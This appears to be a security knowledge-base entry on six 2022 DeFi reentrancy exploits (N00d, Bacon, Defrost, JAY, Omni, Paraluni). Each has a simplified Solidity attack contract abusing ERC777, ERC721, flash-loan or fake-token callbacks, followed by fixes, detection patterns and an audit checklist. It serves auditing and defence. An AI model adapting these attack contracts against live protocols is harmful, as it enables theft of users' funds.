---
protocol: Multi-Protocol
chain: Ethereum, BSC, Avalanche
category: reentrancy
vulnerability_type: Advanced Reentrancy Patterns
attack_type:
  - ERC777 tokensToSend hook reentrancy
  - ERC777 tokensReceived hook reentrancy
  - ERC3156 flash loan callback reentrancy
  - Fake ERC721 transferFrom reentrancy
  - ERC721 onERC721Received callback reentrancy
  - Fake token transferFrom reentrancy
source: DeFiHackLabs
total_exploits_analyzed: 6
total_losses: "$2M+"
affected_component:
  - SushiBar-style staking contracts
  - Lending protocols (ERC777 mint)
  - ERC4626-style vaults
  - NFT-collateralized lending pools
  - DEX MasterChef deposit functions
primitives:
  - reentrancy
  - erc777_hook
  - erc721_callback
  - flash_loan_callback
  - fake_token
  - state_inconsistency
severity: CRITICAL
impact: Share inflation, 3x lending, vault drain, double-credit deposits
exploitability: Medium to High
financial_impact: "$2M+ aggregate"
tags:
  - defihacklabs
  - reentrancy
  - erc777
  - erc721
  - tokensToSend
  - tokensReceived
  - onERC721Received
  - flash-loan-callback
  - fake-token
  - cross-function-reentrancy
  - N00d
  - Bacon
  - Defrost
  - JAY
  - Omni
  - Paraluni
---

# DeFiHackLabs Advanced Reentrancy Patterns (2021-2022)

## Overview

This entry catalogs 6 reentrancy exploits from 2022 sourced from [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs). Unlike classic reentrancy (ETH transfer → re-enter withdraw), these exploit **callback mechanisms in token standards** (ERC777, ERC721, ERC3156) and **untrusted external calls via fake tokens**.

**Categories covered:**
1. **ERC777 `tokensToSend` Hook** — Reenter staking during token transfer (N00d)
2. **ERC777 `tokensReceived` Hook** — Reenter lending during token mint (Bacon)
3. **ERC3156 `onFlashLoan` Callback** — Deposit during vault's own flash loan (Defrost)
4. **Fake ERC721 `transferFrom`** — Custom contract reenters via fake NFT (JAY)
5. **ERC721 `onERC721Received`** — Reenter liquidation/borrow during NFT transfer (Omni)
6. **Fake Token `transferFrom`** — Custom ERC20 reenters deposit function (Paraluni)

---

## Vulnerability Description

### Root Cause Analysis

Advanced reentrancy exploits callback mechanisms that developers often overlook:

1. **ERC777 Hooks**: ERC777 tokens call `tokensToSend` on the sender and `tokensReceived` on the receiver during every transfer/mint. If a protocol interacts with ERC777 tokens without reentrancy guards, any transfer or mint becomes a reentrancy vector.

2. **ERC721 Callbacks**: `safeTransferFrom` calls `onERC721Received` on the recipient. NFT lending protocols that use `safeTransferFrom` during withdrawal/liquidation expose themselves to reentrancy.

3. **Flash Loan Callbacks**: ERC3156 flash loans call `onFlashLoan` on the borrower. If the vault's own deposit function is callable during this callback, the borrower can deposit the flash-loaned funds, receive shares at a deflated price, and extract profit.

4. **Untrusted Token Contracts**: When protocols accept arbitrary token addresses and call methods like `transferFrom`, an attacker can deploy a contract that reenters the protocol during the call.

### Reentrancy Vector Taxonomy

```
┌──────────────────────────────────────────────────┐
│ Token Standard Callbacks                         │
│ ├─ ERC777: tokensToSend(), tokensReceived()      │
│ ├─ ERC721: onERC721Received()                    │
│ └─ ERC3156: onFlashLoan()                        │
├──────────────────────────────────────────────────┤
│ Untrusted External Calls                         │
│ ├─ Fake ERC721: transferFrom() → reenter         │
│ └─ Fake ERC20: transferFrom() → reenter          │
├──────────────────────────────────────────────────┤
│ Classic (NOT covered here — see other entries)    │
│ ├─ ETH transfer: receive()/fallback()            │
│ └─ Read-only: balanceOf during state update      │
└──────────────────────────────────────────────────┘
```

---

## Vulnerable Pattern Examples

### Pattern 1: ERC777 `tokensToSend` Hook → Reenter Staking

**Severity**: 🔴 CRITICAL | **Loss**: WETH | **Protocol**: N00d Token | **Chain**: Ethereum

N00d is an ERC777 token. The SushiBar-style staking contract's `enter()` function transfers N00d tokens from the caller, triggering the ERC777 `tokensToSend` hook. The attacker registers themselves as an ERC777 sender via the ERC1820 registry, then reenters `enter()` from the hook — inflating their xN00d shares before the first `enter()` finalizes.

```solidity
// @audit-issue ERC777 tokensToSend hook enables reentrancy into Bar.enter()
contract N00dExploit {
    uint256 i;
    
    // Step 1: Register as ERC777 sender via ERC1820 registry
    function setUp() internal {
        ERC1820Registry.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensSender"),
            address(this)
        );
    }
    
    // Step 2: Call Bar.enter() — triggers N00d token transfer
    function attack() external {
        N00d.approve(address(Bar), type(uint256).max);
        Bar.enter(enterAmount);
    }
    
    // Step 3: ERC777 hook fires during transfer inside enter()
    // @audit Reentrancy vector — called before enter() state is finalized
    function tokensToSend(
        address operator, address from, address to,
        uint256 amount, bytes calldata, bytes calldata
    ) external {
        if (to == address(Bar) && i < 2) {
            i++;
            // @audit Reentrant call — state hasn't been updated yet
            Bar.enter(enterAmount);
        }
    }
    
    // Result: 3x enter() executed with stale share calculation
    // Attacker receives inflated xN00d shares
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/N00d_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/N00d_exp.sol) | Block: 15,826,379

---

### Pattern 2: ERC777 `tokensReceived` Hook → Reenter Lending

**Severity**: 🔴 CRITICAL | **Loss**: USDC | **Protocol**: Bacon Protocol | **Chain**: Ethereum

Bacon's `lend()` function mints an ERC777-compatible bToken to the caller. The `tokensReceived` callback fires on mint, allowing the attacker to reenter `lend()` during the first mint — receiving 3x the expected bTokens.

```solidity
// @audit-issue ERC777 tokensReceived hook during mint → reenter lend()
contract BaconExploit {
    uint256 count;
    
    // Step 1: Register as ERC777 receiver via ERC1820 registry
    function setUp() internal {
        ERC1820Registry.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
    }
    
    // Step 2: Call bacon.lend() with flash-loaned USDC
    function attack() external {
        USDC.approve(address(bacon), type(uint256).max);
        bacon.lend(2_120_000_000_000);  // 2.12M USDC
    }
    
    // Step 3: Hook fires when bToken is minted to this contract
    // @audit Reentrancy during mint — lend() state not finalized
    function tokensReceived(
        address, address, address,
        uint256, bytes calldata, bytes calldata
    ) public {
        count += 1;
        if (count <= 2) {
            // @audit 2 more reentrant lend() calls → 3x bTokens total
            bacon.lend(2_120_000_000_000);
        }
    }
    
    // Result: 3x bTokens minted for 1x USDC deposit
    // Redeem bTokens → extract 3x USDC
}
```

**Reference**: [DeFiHackLabs/src/test/2022-03/Bacon_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Bacon_exp.sol) | Block: 14,326,931

---

### Pattern 3: ERC3156 Flash Loan Callback → Deposit During Own Loan

**Severity**: 🔴 CRITICAL | **Loss**: USDC | **Protocol**: Defrost Finance | **Chain**: Avalanche

The Defrost vault offers ERC3156 flash loans. During the `onFlashLoan` callback, the vault's `totalAssets` is depleted (the loaned amount is out). The attacker calls `deposit()` during the callback — shares are minted at a deflated price because the vault appears to have fewer assets. After the flash loan returns, shares are redeemable at full value.

```solidity
// @audit-issue Deposit during vault's own flash loan → shares at deflated price
contract DefrostExploit {
    function attack() external {
        // Step 1: Flash loan maximum USDC from the vault itself
        uint256 maxLoan = LSW.maxFlashLoan(address(USDC));
        LSW.flashLoan(address(this), address(USDC), maxLoan, "");
    }
    
    // Step 2: Callback — vault's totalAssets is depleted
    // @audit During flash loan, vault balance = normal - loanAmount
    function onFlashLoan(
        address initiator, address token,
        uint256 amount, uint256 fee, bytes calldata
    ) external returns (bytes32) {
        USDC.approve(address(LSW), type(uint256).max);
        
        // @audit Deposit into vault during its own flash loan
        // totalAssets is low → share price is deflated → get more shares
        depositAmount = LSW.deposit(amount, address(this));
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    // Step 3: After flash loan repaid, vault totalAssets restored
    // Redeem shares at full (restored) value → profit
    function extractProfit() external {
        LSW.redeem(depositAmount, address(this), address(this));
    }
}
```

**Reference**: [DeFiHackLabs/src/test/2022-12/Defrost_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Defrost_exp.sol) | Block: 24,003,940 (Avalanche)

---

### Pattern 4: Fake ERC721 `transferFrom` → Reenter Sell During Buy

**Severity**: 🟠 HIGH | **Loss**: ~15.32 ETH | **Protocol**: JAY Token | **Chain**: Ethereum

JAY's `buyJay()` accepts ERC721 addresses and calls `transferFrom` on them. The attacker passes their own contract as an "ERC721", whose `transferFrom` reenters `JAY_TOKEN.sell()` to sell previously purchased tokens at a higher price — before the buy state is finalized.

```solidity
// @audit-issue buyJay() calls transferFrom on untrusted address → reentrancy
contract JAYExploit {
    // Step 1: Buy JAY tokens with WETH
    function attack() external {
        WETH.approve(address(JAY_TOKEN), type(uint256).max);
        JAY_TOKEN.buyJay{value: 100 ether}();
    }
    
    // Step 2: buyJay() calls transferFrom on attacker's "ERC721"
    // @audit Fake ERC721 — transferFrom reenters JAY_TOKEN
    function transferFrom(address, address, uint256) external {
        // @audit Sell during buy — price state is inconsistent
        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));
    }
    
    // Result: Sell executes at a higher internal price because the
    // buy's state changes haven't been applied yet
}
```

**Reference**: [DeFiHackLabs/src/test/2022-12/JAY_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/JAY_exp.sol) | Block: 16,288,199

---

### Pattern 5: ERC721 `onERC721Received` → Reenter Liquidation + Borrow

**Severity**: 🔴 CRITICAL | **Loss**: ETH | **Protocol**: Omni Protocol | **Chain**: Ethereum

Omni's NFT lending uses `safeTransferFrom` for ERC721 transfers, which triggers `onERC721Received`. During withdrawal of NFT collateral, the callback allows the attacker to trigger liquidation of remaining collateral, then re-supply NFTs and borrow again — resulting in double-borrowing.

```solidity
// @audit-issue safeTransferFrom → onERC721Received → reenter liquidation + borrow
contract OmniExploit {
    uint256 nonce;
    
    function attack() external {
        // Supply 3 Doodles NFTs as collateral, borrow max WETH
        pool.supplyERC721(doodlesAddr, tokenIds, address(this), 0);
        pool.borrow(address(WETH), borrowAmount, 2, 0, address(this));
        
        // Withdraw 2 of 3 NFTs → triggers onERC721Received
        pool.withdrawERC721(doodlesAddr, [id1, id2], address(this));
    }
    
    // @audit Callback during NFT withdrawal — state is partially updated
    function onERC721Received(
        address, address, uint256, bytes calldata
    ) external returns (bytes4) {
        if (msg.sender == NToken) {
            if (nonce == 21) {
                nonce++;
                // @audit Trigger liquidation during withdrawal callback
                // Remaining NFT still counted as collateral in stale state
                pool.liquidationERC721(
                    address(doodles), address(WETH),
                    address(_lib), 7425, 100 ether, false
                );
            } else if (nonce == 22) {
                // @audit Re-supply 20 NFTs and borrow again inside liquidation callback
                pool.supplyERC721(doodlesAddr, newTokenIds, address(this), 0);
                pool.borrow(address(WETH), newBorrowAmount, 2, 0, address(this));
            }
        }
        return this.onERC721Received.selector;
    }
}
```

**Reference**: [DeFiHackLabs/src/test/2022-07/Omni_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/Omni_exp.sol) | Block: 15,114,361

---

### Pattern 6: Fake Token `transferFrom` → Reenter MasterChef Deposit

**Severity**: 🔴 CRITICAL | **Loss**: USDT + BUSD | **Protocol**: Paraluni | **Chain**: BSC

Paraluni's `depositByAddLiquidity()` accepts arbitrary token pair addresses and calls `transferFrom` on them. A fake token contract reenters `depositByAddLiquidity()` with real tokens during the transfer, resulting in double-credited LP shares.

```solidity
// @audit-issue depositByAddLiquidity() calls transferFrom on untrusted token
contract EvilToken {
    // @audit Fake token's transferFrom reenters MasterChef with real tokens
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (address(masterchef) != address(0) && msg.sender != address(masterchef)) {
            // @audit Reentrant deposit with real USDT + BUSD
            usdt.approve(address(masterchef), type(uint256).max);
            busd.approve(address(masterchef), type(uint256).max);
            masterchef.depositByAddLiquidity(
                18,  // pool ID
                [address(usdt), address(busd)],
                [usdt.balanceOf(address(this)), busd.balanceOf(address(this))]
            );
        }
        return true;
    }
}

// Attack flow:
// 1. Call depositByAddLiquidity(poolId, [evilToken, busd], amounts)
// 2. MasterChef calls evilToken.transferFrom() → triggers reentry
// 3. Inside reentry: deposit real USDT+BUSD → shares credited
// 4. Outer deposit also finalizes → shares double-credited
// 5. Withdraw all shares → drain pool
```

**Reference**: [DeFiHackLabs/src/test/2022-03/Paraluni_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Paraluni_exp.sol) | Block: 16,008,280

---

## Impact Analysis

| Protocol | Date | Loss | Reentrancy Vector | Chain |
|----------|------|------|-------------------|-------|
| Omni Protocol | Jul 2022 | ETH (NFT lending) | ERC721 `onERC721Received` | Ethereum |
| Bacon Protocol | Mar 2022 | USDC (via flash loan) | ERC777 `tokensReceived` | Ethereum |
| N00d Token | Oct 2022 | WETH | ERC777 `tokensToSend` | Ethereum |
| JAY Token | Dec 2022 | ~15.32 ETH | Fake ERC721 `transferFrom` | Ethereum |
| Defrost Finance | Dec 2022 | USDC | ERC3156 `onFlashLoan` | Avalanche |
| Paraluni | Mar 2022 | USDT + BUSD | Fake token `transferFrom` | BSC |

---

## Secure Implementation

### Fix 1: Reentrancy Guard (OpenZeppelin `nonReentrant`)

```solidity
// SECURE: nonReentrant modifier prevents all reentrancy
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureStaking is ReentrancyGuard {
    // @audit-fix nonReentrant prevents ERC777 hook reentrancy
    function enter(uint256 amount) external nonReentrant {
        uint256 totalSupply = totalSupply();
        uint256 totalToken = token.balanceOf(address(this));
        
        if (totalSupply == 0) {
            _mint(msg.sender, amount);
        } else {
            uint256 shares = amount * totalSupply / totalToken;
            _mint(msg.sender, shares);
        }
        
        // Transfer happens AFTER state is finalized
        token.transferFrom(msg.sender, address(this), amount);
    }
}
```

### Fix 2: CEI Pattern (Checks-Effects-Interactions)

```solidity
// SECURE: Update state BEFORE external calls
contract SecureLending {
    function lend(uint256 amount) external nonReentrant {
        // @audit-fix CHECKS
        require(amount > 0, "Zero amount");
        require(amount <= maxLend, "Exceeds max");
        
        // @audit-fix EFFECTS — update state before external interaction
        shares[msg.sender] += calculateShares(amount);
        totalDeposited += amount;
        
        // @audit-fix INTERACTIONS — external call is last
        token.transferFrom(msg.sender, address(this), amount);
    }
}
```

### Fix 3: Validate Token Contracts (Whitelist)

```solidity
// SECURE: Only accept whitelisted token addresses
contract SecureMasterChef {
    mapping(address => bool) public whitelistedTokens;
    
    function depositByAddLiquidity(
        uint256 poolId,
        address[2] calldata tokens,
        uint256[2] calldata amounts
    ) external nonReentrant {
        // @audit-fix Reject unknown/fake tokens
        require(whitelistedTokens[tokens[0]], "Token 0 not whitelisted");
        require(whitelistedTokens[tokens[1]], "Token 1 not whitelisted");
        
        // Safe to proceed — tokens are known-good ERC20s
        IERC20(tokens[0]).transferFrom(msg.sender, address(this), amounts[0]);
        IERC20(tokens[1]).transferFrom(msg.sender, address(this), amounts[1]);
        
        _addLiquidity(tokens, amounts);
        _creditShares(msg.sender, poolId);
    }
}
```

### Fix 4: Flash Loan Guard for Vault Deposits

```solidity
// SECURE: Prevent deposits during the vault's own flash loan
contract SecureVault is ERC4626 {
    bool private _flashLoanActive;
    
    modifier noFlashLoanDeposit() {
        // @audit-fix Block deposits while flash loan is active
        require(!_flashLoanActive, "Deposit during flash loan");
        _;
    }
    
    function flashLoan(address borrower, address token, uint256 amount, bytes calldata data) external {
        _flashLoanActive = true;
        // ... execute flash loan
        _flashLoanActive = false;
    }
    
    function deposit(uint256 assets, address receiver)
        public override noFlashLoanDeposit returns (uint256 shares)
    {
        return super.deposit(assets, receiver);
    }
}
```

---

## Detection Patterns

### Static Analysis

```yaml
- pattern: "ERC777|ERC1820|tokensToSend|tokensReceived"
  check: "Any contract interacting with ERC777 MUST have nonReentrant on all state-changing functions"
  
- pattern: "safeTransferFrom.*ERC721|onERC721Received"
  check: "NFT lending/staking using safeTransferFrom must have nonReentrant guards"
  
- pattern: "onFlashLoan|flashLoan.*callback"
  check: "Verify deposit/withdraw functions are blocked during flash loan callbacks"
  
- pattern: "transferFrom.*address.*token|token\\.transferFrom"
  check: "If token address is user-supplied, verify it's whitelisted — fake tokens can reenter"
  
- pattern: "buyJay|acceptNFT|transferFrom.*ERC721.*param"
  check: "If function accepts NFT address parameter and calls transferFrom, verify address is trusted"
  
- pattern: "enter\\(|deposit\\(|lend\\("
  check: "Verify CEI pattern — state updated BEFORE external calls"
```

### Invariant Checks

```
INV-REENT-001: No state-changing function accessible from ERC777 tokensToSend/tokensReceived callbacks
INV-REENT-002: No state-changing function accessible from ERC721 onERC721Received callbacks
INV-REENT-003: Deposit/withdraw must be blocked during the vault's own flash loan execution
INV-REENT-004: All external token calls must use whitelisted addresses — never accept arbitrary token params
INV-REENT-005: Share calculations must use post-interaction state (CEI: Checks-Effects-Interactions)
INV-REENT-006: LP share credits must exactly match liquidity added — no double-crediting
```

---

## Audit Checklist

- [ ] **ERC777 Compatibility**: Does the protocol interact with any ERC777 tokens? Are all functions guarded with `nonReentrant`?
- [ ] **ERC721 safeTransferFrom**: Does the protocol use `safeTransferFrom` for NFTs? Is `onERC721Received` considered as a reentrancy vector?
- [ ] **Flash Loan Self-Interaction**: Can the vault's own functions be called during its flash loan callback?
- [ ] **Token Address Validation**: Does any function accept arbitrary token/NFT addresses and call methods on them?
- [ ] **CEI Pattern**: Is state updated BEFORE any external calls (especially token transfers)?
- [ ] **Reentrancy Guards**: Are critical functions protected with `nonReentrant` modifier?

---

## Real-World Examples

| Protocol | Date | Loss | TX/Reference |
|----------|------|------|-------------|
| Omni Protocol | Jul 2022 | ETH | Block 15,114,361 |
| Bacon Protocol | Mar 2022 | USDC | Block 14,326,931 |
| N00d Token | Oct 2022 | WETH | [Etherscan](https://etherscan.io/tx/0x8037b3dc0bf9d5d396c10506824096afb8125ea96ada011d35faa89fa3893aea) |
| JAY Token | Dec 2022 | ~15.32 ETH | Block 16,288,199 |
| Defrost Finance | Dec 2022 | USDC | Block 24,003,940 (Avalanche) |
| Paraluni | Mar 2022 | USDT + BUSD | Block 16,008,280 (BSC) |

---

## Keywords

reentrancy, erc777, erc721, tokensToSend, tokensReceived, onERC721Received, ERC1820, ERC3156, onFlashLoan, flash_loan_reentrancy, fake_token, fake_erc721, untrusted_external_call, cross_function_reentrancy, nonReentrant, CEI_pattern, checks_effects_interactions, share_inflation, double_credit, depositByAddLiquidity, defihacklabs, N00d, Bacon, Defrost, JAY, Omni, Paraluni
